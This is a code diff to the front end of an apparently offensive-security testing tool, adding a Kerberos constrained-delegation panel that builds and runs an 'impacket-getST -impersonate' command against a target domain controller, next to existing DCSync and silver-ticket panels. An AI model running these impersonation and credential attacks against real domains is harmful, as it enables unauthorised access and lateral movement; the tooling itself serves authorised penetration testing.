@@ -17,6 +17,7 @@ import AsrepRoastPanel from "./AsrepRoastPanel";
 import PasswordSprayPanel from "./PasswordSprayPanel";
 import DomainDominancePanel from "./DomainDominancePanel";
 import SilverTicketPanel from "./SilverTicketPanel";
+import ConstrainedDelegationPanel from "./ConstrainedDelegationPanel";
 import CiscoType7Decoder from "./CiscoType7Decoder";
 import GppCpasswordDecoder from "./GppCpasswordDecoder";
 import RoundcubeDesDecoder from "./RoundcubeDesDecoder";
@@ -792,6 +793,22 @@ export default function App() {
       },
     });
   };
+  const runConstrainedDelegation = (fields: {
+    spn: string; targetUsername: string; domain: string; username: string; password: string;
+  }) => {
+    if (!target) return;
+    setRunWithSudo(false);
+    void run({
+      id: "ad-constrained-delegation-getst",
+      preview: `impacket-getST -spn ${fields.spn} -impersonate ${fields.targetUsername}` +
+        ` -dc-ip ${target.ip} ${fields.domain}/${fields.username}:***`,
+      target_level: true,
+      variables: {
+        spn: fields.spn, target_username: fields.targetUsername, domain: fields.domain,
+        username: fields.username, password: fields.password,
+      },
+    });
+  };
   const saveDcsyncHash = async (dumpedUsername: string, nthash: string) => {
     if (!projectId || !targetId) return;
     setSaveHashMsg("");
@@ -1219,6 +1236,13 @@ export default function App() {
               serviceExecutions={serviceExecutions} evidenceMsg={evidenceMsg}
               dcsyncStdout={runStates["ad-dcsync-secretsdump"]?.stdout}
               onForge={runSilverTicketForge}
+              onCaptureEvidence={(execution, title) => void captureEvidence(execution, title)} />
+          )}
+          {["ldap", "ldaps"].includes(serviceNameLower) && (
+            <ConstrainedDelegationPanel target={target}
+              runState={runStates["ad-constrained-delegation-getst"]}
+              serviceExecutions={serviceExecutions} evidenceMsg={evidenceMsg}
+              onRequest={runConstrainedDelegation}
               onCaptureEvidence={(execution, title) => void captureEvidence(execution, title)} />
           )}
           {["microsoft-ds", "netbios-ssn", "smb"].includes(serviceNameLower) && (
